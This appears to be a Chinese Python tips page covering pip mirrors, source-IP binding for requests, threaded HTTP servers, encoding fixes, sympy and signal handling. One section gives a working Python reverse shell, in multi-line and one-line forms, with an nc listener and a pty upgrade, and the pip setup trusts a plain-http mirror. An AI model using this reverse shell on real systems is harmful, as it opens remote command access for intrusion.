<h2 id="pip">设置pip源<a class="headerlink" href="#pip" title="Permanent link">&para;</a></h2>
<p>如果只需要一次性安装个包（如Dockerfile）： pip install -i https://pypi.doubanio.com/simple/ &ndash;trusted-host pypi.doubanio.com</p>
<p>在Linux服务器上安装python的包时，执行这段代码可以将pip源改为国内的豆瓣源，能显著提高包的下载速度</p>
<div class="codehilite"><pre><span></span>mkdir -p ~/.pip
<span class="nb">echo</span> <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">[global]</span>
<span class="s2">index-url = http://pypi.doubanio.com/simple/</span>
<span class="s2">[install]</span>
<span class="s2">trusted-host=pypi.doubanio.com</span>
<span class="s2">&quot;&quot;&quot;</span>&gt;~/.pip/pip.conf
</pre></div>


<p>至于Windows用户，在用户目录下创建一个pip目录，如：C:\Users\chenyuan\pip，新建文件pip.ini，内容如下：</p>
<div class="codehilite"><pre><span></span><span class="k">[global]</span>
<span class="na">index-url</span> <span class="o">=</span> <span class="s">http://pypi.doubanio.com/simple/</span>
<span class="k">[install]</span>
<span class="na">trusted-host</span><span class="o">=</span><span class="s">pypi.doubanio.com</span>
</pre></div>


<h3 id="shell">反弹shell<a class="headerlink" href="#shell" title="Permanent link">&para;</a></h3>
<p>首先自己的服务器上用<strong>nc -l 端口</strong></p>
<div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">os</span>
<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span> <span class="s2">&quot;IP地址&quot;</span> <span class="p">,</span> <span class="err">端口</span> <span class="p">))</span>
<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">)</span>
<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span>
<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span>
<span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">([</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="s2">&quot;-i&quot;</span><span class="p">])</span>
</pre></div>


<p>单行版本：</p>
<div class="codehilite"><pre><span></span><span class="n">IP</span><span class="o">=</span><span class="s2">&quot;x.x.x.x&quot;</span><span class="p">;</span><span class="n">PORT</span><span class="o">=</span><span class="mi">6666</span><span class="p">;</span><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">os</span><span class="p">;</span><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">);</span><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span> <span class="n">IP</span> <span class="p">,</span> <span class="n">PORT</span> <span class="p">));</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">);</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">);</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">);</span><span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">([</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="s2">&quot;-i&quot;</span><span class="p">])</span>
</pre></div>


<h3 id="tty">获得一个tty<a class="headerlink" href="#tty" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
</pre></div>


<hr />
<h2 id="requestsip">让requests使用多个IP<a class="headerlink" href="#requestsip" title="Permanent link">&para;</a></h2>
<p>requests包并没有使用socket.create_connection函数，所以替换socket.create_connection并不够</p>
<div class="codehilite"><pre><span></span><span class="k">def</span> <span class="nf">function_hook_parameter</span><span class="p">(</span><span class="n">oldfunc</span><span class="p">,</span> <span class="n">parameter_index</span><span class="p">,</span> <span class="n">parameter_name</span><span class="p">,</span> <span class="n">parameter_value</span><span class="p">):</span>
    <span class="sd">&quot;&quot;&quot;</span>
<span class="sd">    创造一个wrapper函数，劫持oldfunc传入的第parameter_index名为parameter_name的函数，固定其值为parameter_value; 不影响调用该函数时传入的任何其他参数</span>
<span class="sd">    用法： 原函数 = function_hook_parameter(原函数, 从1开始计数的参数所处的位置, 这个参数的名称, 需要替换成的参数值)</span>

<span class="sd">    例子： 需要劫持socket.create_connection这个函数，其函数原型如下： </span>
<span class="sd">               create_connection(address, timeout=_GLOBAL_DEFAULT_TIMEOUT, source_address=None)</span>
<span class="sd">           需要对其第3个参数source_address固定为value，劫持方法如下</span>
<span class="sd">               socket.create_connection = function_hook_parameter(socket.create_connection, 3, &quot;source_address&quot;, value)</span>
<span class="sd">    &quot;&quot;&quot;</span>
    <span class="n">real_func</span> <span class="o">=</span> <span class="n">oldfunc</span>
    <span class="k">def</span> <span class="nf">newfunc</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>  <span class="c1"># args是参数列表list，kwargs是带有名称keyword的参数dict</span>
        <span class="n">newargs</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">args</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="n">parameter_index</span><span class="p">:</span>  <span class="c1"># 如果这个参数被直接传入，那么肯定其前面的参数都是无名称的参数，args的长度肯定长于其所在的位置</span>
            <span class="n">newargs</span><span class="p">[</span><span class="n">parameter_index</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">parameter_value</span>  <span class="c1"># 第3个参数在list的下标是2</span>
        <span class="k">else</span><span class="p">:</span>  <span class="c1"># 如果不是直接传入，那么就在kwargs中 或者传入的可选参数中没有这个参数，直接设置kwargs即可</span>
            <span class="n">kwargs</span><span class="p">[</span><span class="n">parameter_name</span><span class="p">]</span> <span class="o">=</span> <span class="n">parameter_value</span>
        <span class="k">return</span> <span class="n">real_func</span><span class="p">(</span><span class="o">*</span><span class="n">newargs</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">newfunc</span>


<span class="n">myip</span> <span class="o">=</span> <span class="s2">&quot;x.x.x.x&quot;</span> <span class="c1">#你需要使用的IP，需要操作系统已经取得这个IP</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="n">socket</span><span class="o">.</span><span class="n">create_connection</span> <span class="o">=</span> <span class="n">function_hook_parameter</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">create_connection</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="s2">&quot;source_address&quot;</span><span class="p">,</span> <span class="p">(</span><span class="n">myip</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="n">bakup_create_connection</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">connection</span><span class="o">.</span><span class="n">create_connection</span> <span class="c1">#备份一份以备后续继续替换</span>
<span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">connection</span><span class="o">.</span><span class="n">create_connection</span> <span class="o">=</span> <span class="n">function_hook_parameter</span><span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">connection</span><span class="o">.</span><span class="n">create_connection</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="s2">&quot;source_address&quot;</span><span class="p">,</span> <span class="p">(</span><span class="n">myip</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>

<span class="c1"># 验证是否成功修改源IP</span>
<span class="k">print</span><span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;http://ip.cn&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">)</span> <span class="c1">#访问网站查看当前使用的公网IP，如果内网你可以自行搭建服务器查看访问日志从而确定IP</span>

<span class="c1"># 如果后续还要进行替换，则应该传入bakup_create_connection</span>
<span class="n">mynewip</span> <span class="o">=</span> <span class="s2">&quot;x.x.x.y&quot;</span> <span class="c1">#另外一个当前操作系统已经取得的IP</span>
<span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">connection</span><span class="o">.</span><span class="n">create_connection</span> <span class="o">=</span> <span class="n">function_hook_parameter</span><span class="p">(</span><span class="n">bakup_create_connection</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="s2">&quot;source_address&quot;</span><span class="p">,</span> <span class="p">(</span><span class="n">mynewip</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
</pre></div>


<hr />
<h2 id="python">Python多线程模板<a class="headerlink" href="#python" title="Permanent link">&para;</a></h2>
<p>使用threading模块进行开发</p>
<p><a href="../code/MultiThread_Template.py">MultiThread_Template.py</a></p>
<h2 id="httpserverbasehttpserver">http.server（BaseHTTPServer）并发性改善<a class="headerlink" href="#httpserverbasehttpserver" title="Permanent link">&para;</a></h2>
<h3 id="new-version">New version 不必修改库代码<a class="headerlink" href="#new-version" title="Permanent link">&para;</a></h3>
<p>在使用BaseHTTPServer.HTTPServer的时候，对其使用的父类修改创造自己的类，参考<a href="https://stackoverflow.com/questions/9539052/how-to-dynamically-change-base-class-of-instances-at-runtime">How to dynamically change base class of instances at runtime?</a></p>
<div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">BaseHTTPServer</span> <span class="c1"># 如果py3，需要import http.server as BaseHTTPServer</span>
<span class="kn">import</span> <span class="nn">socketserver</span>
<span class="n">MyHTTPServer</span> <span class="o">=</span> <span class="nb">type</span><span class="p">(</span><span class="s1">&#39;MyHTTPServer&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">socketserver</span><span class="o">.</span><span class="n">ThreadingTCPServer</span><span class="p">,),</span> <span class="nb">dict</span><span class="p">(</span><span class="n">BaseHTTPServer</span><span class="o">.</span><span class="n">HTTPServer</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">MyHandler</span><span class="p">(</span><span class="n">BaseHTTPServer</span><span class="o">.</span><span class="n">BaseHTTPRequestHandler</span><span class="p">):</span>
    <span class="k">pass</span> <span class="c1"># 省略handler的代码，一些do_GET，do_POST的函数</span>

<span class="n">httpd</span> <span class="o">=</span> <span class="n">MyHTTPServer</span><span class="p">(</span> <span class="p">(</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="mi">80</span><span class="p">),</span> <span class="n">MyHandler</span><span class="p">)</span>
<span class="n">httpd</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
</pre></div>


<p>怎么知道MyHTTPServer的父类确实被修改了呢？ 可以查看其<strong>mro</strong>属性（Method Resolution Order attribute）</p>
<h3 id="old-version">Old version 修改库代码(不建议)<a class="headerlink" href="#old-version" title="Permanent link">&para;</a></h3>
<blockquote>
<p>参考资料：<a href="http://blog.csdn.net/cnmilan/article/details/9664823">利用Python中SocketServer 实现客户端与服务器间非阻塞通信</a></p>
<p>直接修改BaseHTTPServer的代码中的一个细节，将BaseHTTPServer类继承的原先只能支持单个请求的SocketServer.TCPServer改为每个连接一个线程的SocketServer.ThreadingTCPServer，使BaseHTTPServer能支持并发而不是一次只能处理单个请求</p>
</blockquote>
<p><strong>Python3的方法</strong>：</p>
<p>在Python3中BaseHTTPServer改名为http.server了，首先找到http.server所在的py文件：</p>
<div class="codehilite"><pre><span></span><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&quot;import http.server; print(http.server)&quot;</span>
</pre></div>


<p>修改其提示的文件，例如我这里是<code>/usr/lib/python3.4/http/server.py</code></p>
<p>搜索<code>class HTTPServer</code>，如果是用vim可以用<code>/class HTTPServer</code></p>
<p>修改找到的这一行，改为：</p>
<div class="codehilite"><pre><span></span><span class="k">class</span> <span class="nc">HTTPServer</span><span class="p">(</span><span class="n">socketserver</span><span class="o">.</span><span class="n">ThreadingTCPServer</span><span class="p">):</span>
</pre></div>


<p><strong>Python2的方法</strong>：</p>
<p>首先找到BaseHTTPServer在哪：</p>
<div class="codehilite"><pre><span></span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&quot;import BaseHTTPServer; print(BaseHTTPServer)&quot;</span>
</pre></div>


<p>修改对应的文件，如/usr/lib/python2.7/BaseHTTPServer.py，注意不要打开他直接提示的pyc文件而是要对应的同名py文件</p>
<p>找到这行（vim中可以输入<code>/class HTTPServer</code>进行搜索）：</p>
<div class="codehilite"><pre><span></span><span class="k">class</span> <span class="nc">HTTPServer</span><span class="p">(</span><span class="n">SocketServer</span><span class="o">.</span><span class="n">TCPServer</span><span class="p">):</span>
</pre></div>


<p>修改其继承的父类：</p>
<div class="codehilite"><pre><span></span><span class="k">class</span> <span class="nc">HTTPServer</span><span class="p">(</span><span class="n">SocketServer</span><span class="o">.</span><span class="n">ThreadingTCPServer</span><span class="p">):</span>
</pre></div>


<hr />
<h2 id="rootpython">无root权限安装Python<a class="headerlink" href="#rootpython" title="Permanent link">&para;</a></h2>
<p>下载最新版python源码后指定prefix编译，假设用户目录为/home/chenyuan</p>
<div class="codehilite"><pre><span></span>apt-get install libssl-dev openssl 
curl -O https://www.python.org/ftp/python/3.5.2/Python-3.5.2.tgz
tar -xzf Python-3.5.2.tgz
cd Python-3.5.2/
./configure --prefix=/home/chenyuan/python3
make
make install &gt;/dev/null
pushd /home/chenyuan/python3/bin
cp python3 python
cp pip3 pip
alias python3=`pwd`/python
alias pip3=`pwd`/pip
</pre></div>


<hr />
<h2 id="_2">中文输出乱码问题<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>方法1：运行py前设置环境变量</p>
<div class="codehilite"><pre><span></span><span class="nb">export</span> <span class="nv">PYTHONIOENCODING</span><span class="o">=</span>utf8
</pre></div>


<p>方法2：强制修改stdout</p>
<div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">sys</span>
<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">,</span> <span class="n">closefd</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
</pre></div>


<hr />
<h2 id="pep8">遵循PEP8检查你的代码<a class="headerlink" href="#pep8" title="Permanent link">&para;</a></h2>
<p><a href="https://github.com/PyCQA/pycodestyle">pycodestyle</a></p>
<p>安装并使用pycodestyle检查代码，忽略E501一行不能长于80个字符的限制：</p>
<div class="codehilite"><pre><span></span>pip install pycodestyle
pycodestyle --show-source --ignore=E501 yourcode.py
</pre></div>


<hr />
<h2 id="_3">生成随机字符串<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="k">def</span> <span class="nf">random_str</span><span class="p">(</span><span class="n">length</span><span class="o">=</span><span class="mi">8</span><span class="p">):</span>
    <span class="k">return</span> <span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">sample</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="p">,</span> <span class="n">length</span><span class="p">))</span>
</pre></div>


<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">Random</span>
<span class="k">def</span> <span class="nf">random_str</span><span class="p">(</span><span class="n">randomlength</span><span class="o">=</span><span class="mi">8</span><span class="p">):</span>
    <span class="nb">str</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
    <span class="n">chars</span> <span class="o">=</span> <span class="s1">&#39;AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789&#39;</span>
    <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">chars</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
    <span class="n">random</span> <span class="o">=</span> <span class="n">Random</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">randomlength</span><span class="p">):</span>
        <span class="nb">str</span><span class="o">+=</span><span class="n">chars</span><span class="p">[</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">length</span><span class="p">)]</span>
    <span class="k">return</span> <span class="nb">str</span>
</pre></div>


<hr />
<h2 id="python_1">Python解方程<a class="headerlink" href="#python_1" title="Permanent link">&para;</a></h2>
<p>需要 <code>pip install sympy</code></p>
<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">sympy</span> <span class="kn">import</span> <span class="o">*</span>
<span class="c1"># 解一元方程：</span>
<span class="c1">#   2x^2-18=0</span>
<span class="n">x</span><span class="o">=</span><span class="n">Symbol</span><span class="p">(</span><span class="s1">&#39;x&#39;</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">solve</span><span class="p">(</span><span class="mi">2</span><span class="o">*</span><span class="n">x</span><span class="o">**</span><span class="mi">2</span><span class="o">-</span><span class="mi">18</span><span class="p">,</span><span class="n">x</span><span class="p">))</span>
<span class="c1"># 得到[-3,3]</span>

<span class="c1"># 解方程组</span>
<span class="c1">#   y=1-x</span>
<span class="c1">#   3x+2y-5</span>
<span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="o">=</span><span class="n">symbols</span><span class="p">(</span><span class="s1">&#39;x y&#39;</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">solve</span><span class="p">([</span> <span class="n">y</span><span class="o">-</span><span class="mi">1</span><span class="o">+</span><span class="n">x</span><span class="p">,</span> <span class="mi">3</span><span class="o">*</span><span class="n">x</span><span class="o">+</span><span class="mi">2</span><span class="o">*</span><span class="n">y</span><span class="o">-</span><span class="mi">5</span> <span class="p">],</span> <span class="p">[</span> <span class="n">x</span> <span class="p">,</span> <span class="n">y</span> <span class="p">]))</span>
<span class="c1"># 得到{x: 3, y: -2}</span>
</pre></div>


<hr />
<h2 id="in">大数据判断in<a class="headerlink" href="#in" title="Permanent link">&para;</a></h2>
<p>一定要用set，因为set的in操作是O(1)的，用list是O(n)速度太慢</p>
<hr />
<h2 id="pythonh-no-such-file-or-directory">解决Python.h: No such file or directory<a class="headerlink" href="#pythonh-no-such-file-or-directory" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span>apt-get install -y python-dev python3-dev
</pre></div>


<p>如果为CentOS系统：</p>
<div class="codehilite"><pre><span></span>yum install python-devel
</pre></div>


<hr />
<h2 id="_4">二进制字符串转普通字符串<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<p>方法一：将字符串每8个分成一组，用int转10进制，再用chr转为ascii字符</p>
<div class="codehilite"><pre><span></span>s=&quot;0110001101111001&quot;
ans=&quot;&quot;
for i in range(0,len(s)//8):
    x = s[i*8:i*8+8]
    ans+=chr(int(x,2))
</pre></div>


<p>方法二：利用binascii，先用int转为10进制，然后转为16进制字符串，调用unhexlify执行翻译</p>
<div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">binascii</span>
<span class="n">s</span><span class="o">=</span><span class="s2">&quot;0110001101111001&quot;</span>
<span class="n">ans</span><span class="o">=</span><span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="s1">&#39;</span><span class="si">%x</span><span class="s1">&#39;</span><span class="o">%</span><span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="mi">2</span><span class="p">))</span>
</pre></div>


<p>补充：相应的如果要把十进制转为二进制，可以用bin(123)[2:]</p>
<hr />
<h2 id="bytes">十六进制字符串转bytes字符串<a class="headerlink" href="#bytes" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b16encode</span><span class="p">,</span><span class="n">b16decode</span>
<span class="k">print</span><span class="p">(</span> <span class="n">b16encode</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;py3.io&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="p">)</span> <span class="c1">#output: 7079332E696F</span>
<span class="k">print</span><span class="p">(</span> <span class="n">b16decode</span><span class="p">(</span><span class="s2">&quot;7079332E696F&quot;</span><span class="o">.</span><span class="n">upper</span><span class="p">())</span> <span class="p">)</span> <span class="c1">#output: b&#39;py3.io&#39;, 这里使用upper转大写</span>
</pre></div>


<p>相应的，拿到一个十进制数，转字符串：</p>
<div class="codehilite"><pre><span></span>key = 5287002131074331513
print( b16decode( hex(key)[2:].upper() ) )#output: b&#39;I_4m-k3y&#39;
</pre></div>


<hr />
<h2 id="python3pat">用Python3写PAT心得<a class="headerlink" href="#python3pat" title="Permanent link">&para;</a></h2>
<ul>
<li>
<p>如果发生格式错误，检查输出的最后一行的print，加上end=&rdquo;&ldquo;表示不要换行</p>
</li>
<li>
<p>如果数据规模大导致超时，代码中的in操作前先把list转为set，能大幅度提速</p>
</li>
</ul>
<hr />
<h2 id="requestspost">用requests进行post<a class="headerlink" href="#requestspost" title="Permanent link">&para;</a></h2>
<p>需要注意加上这两个参数：</p>
<div class="codehilite"><pre><span></span>,allow_redirects=False,headers={&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}
</pre></div>


<p>登录请求的时候是要根据返回的headers里面Location有没有对不对来判断登录是否成功的，而requests默认会跟随301/302跳转，导致无法获取到跳转请求的headers，所以加上<code>allow_redirects=False</code></p>
<p>另外就是post数据的时候必须给出正确的Content-Type，否则服务器不认这个post的</p>
<p>再者就是可能对方有反爬虫措施，加上Referer和User-Agent就好咯</p>
<p>如果需要提交的是json的数据，记得post的data的单双引号要正确，应该用json.dumps的结果去post</p>
<p>如果要做爬虫，欢迎使用我的<a href="https://github.com/zjuchenyuan/EasyLogin">EasyLogin</a>，无需再操心这些细节，专注于核心爬虫代码</p>
<hr />
<h2 id="tkinter">通过tkinter获取、修改剪贴板<a class="headerlink" href="#tkinter" title="Permanent link">&para;</a></h2>
<p>支持py2和py3，Learned from https://www.daniweb.com/programming/software-development/code/487653/access-the-clipboard-via-tkinter</p>
<div class="codehilite"><pre><span></span><span class="k">try</span><span class="p">:</span>
    <span class="kn">from</span> <span class="nn">tkinter</span> <span class="kn">import</span> <span class="n">Tk</span>
<span class="k">except</span> <span class="ne">ImportError</span><span class="p">:</span>
    <span class="kn">from</span> <span class="nn">Tkinter</span> <span class="kn">import</span> <span class="n">Tk</span>
<span class="n">root</span> <span class="o">=</span> <span class="n">Tk</span><span class="p">()</span>
<span class="n">root</span><span class="o">.</span><span class="n">withdraw</span><span class="p">()</span> <span class="c1">#隐藏Tk的窗口</span>
<span class="n">text</span> <span class="o">=</span> <span class="s2">&quot;Donnerwetter&quot;</span>
<span class="c1"># 清空剪贴板 clear clipboard</span>
<span class="n">root</span><span class="o">.</span><span class="n">clipboard_clear</span><span class="p">()</span>
<span class="c1"># 写入剪贴板 write text to clipboard</span>
<span class="n">root</span><span class="o">.</span><span class="n">clipboard_append</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
<span class="c1"># 读取剪贴板 text from clipboard</span>
<span class="n">clip_text</span> <span class="o">=</span> <span class="n">root</span><span class="o">.</span><span class="n">clipboard_get</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">clip_text</span><span class="p">)</span>  <span class="c1"># --&gt; Donnerwetter</span>
</pre></div>


<hr />
<h2 id="_5">符号数与无符号数转换<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
<h3 id="_6">无符号→有符号，为了加上负号：<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">ctypes</span>
<span class="n">ctypes</span><span class="o">.</span><span class="n">c_int64</span><span class="p">(</span><span class="mi">17039472050328044269</span><span class="p">)</span><span class="o">.</span><span class="n">value</span>
</pre></div>


<p>上述将得到-1407272023381507347</p>
<h3 id="_7">有符号→无符号，为了去掉负号：<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">ctypes</span>
<span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span><span class="p">(</span><span class="o">-</span><span class="mi">1407272023381507347</span><span class="p">)</span><span class="o">.</span><span class="n">value</span>
</pre></div>


<p>上述将得到17039472050328044269</p>
<hr />
<h2 id="signalsigalrm-only-linux">使用signal.SIGALRM在限定时间后退出进程 (only Linux)<a class="headerlink" href="#signalsigalrm-only-linux" title="Permanent link">&para;</a></h2>
<p>在设计CTF的题目的时候，有必要限制用户的连接时间，这时候简单方案就是用SIGALRM信号咯</p>
<div class="codehilite"><pre><span></span><span class="k">def</span> <span class="nf">clock</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">):</span>
    <span class="kn">import</span> <span class="nn">signal</span>
    <span class="k">def</span> <span class="nf">signal_handler</span><span class="p">(</span><span class="n">signum</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">signum</span> <span class="o">==</span> <span class="n">signal</span><span class="o">.</span><span class="n">SIGALRM</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s2">&quot;Time is up!&quot;</span><span class="p">)</span>
            <span class="nb">exit</span><span class="p">()</span>
    <span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGALRM</span><span class="p">,</span> <span class="n">signal_handler</span><span class="p">)</span>
    <span class="n">signal</span><span class="o">.</span><span class="n">alarm</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">timeout</span><span class="p">))</span>
</pre></div>


<hr />
<h2 id="ctrlc">捕捉用户的Ctrl+C<a class="headerlink" href="#ctrlc" title="Permanent link">&para;</a></h2>
<p>特殊情况下我们想屏蔽掉Ctrl+C，这时候写个自己的函数处理SIGALRM信号就好啦</p>
<div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">signal</span>

<span class="k">def</span> <span class="nf">signal_handler</span><span class="p">(</span><span class="n">signum</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">signum</span> <span class="o">==</span> <span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s2">&quot;Ctrl+C is pressed!&quot;</span><span class="p">)</span>
        <span class="c1">#raise KeyboardInterrupt</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal_handler</span><span class="p">)</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mi">666</span><span class="p">)</span>
</pre></div>


<hr />
<h2 id="signalsigalrm-only-linux_1">使用signal.SIGALRM实现定时器 (only Linux)<a class="headerlink" href="#signalsigalrm-only-linux_1" title="Permanent link">&para;</a></h2>
<p>实现一个类似Javascript的setInterval功能</p>
<div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">signal</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
<span class="n">INTERVAL</span><span class="o">=</span><span class="mi">1</span>
<span class="n">COUNT</span><span class="o">=</span><span class="mi">0</span>
<span class="k">def</span> <span class="nf">signal_handler</span><span class="p">(</span><span class="n">signum</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">COUNT</span>
